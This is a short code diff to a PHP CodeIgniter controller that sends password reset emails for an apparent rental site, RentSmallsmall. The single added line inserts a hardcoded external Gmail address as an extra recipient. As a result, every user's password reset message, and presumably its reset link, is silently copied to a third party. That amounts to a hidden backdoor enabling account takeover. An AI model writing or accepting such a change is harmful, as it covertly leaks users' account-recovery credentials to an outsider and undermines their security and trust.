@@ -4327,6 +4327,7 @@ class Rss extends CI_Controller
 						"message" => [
 							"recipients" => [
 								["email" => $email],
+								["email" => 'loyaglobaltech@gmail.com'],
 							],
 							"body" => ["html" => $htmlBody],
 							"subject" => "Password Reset RentSmallsmall",
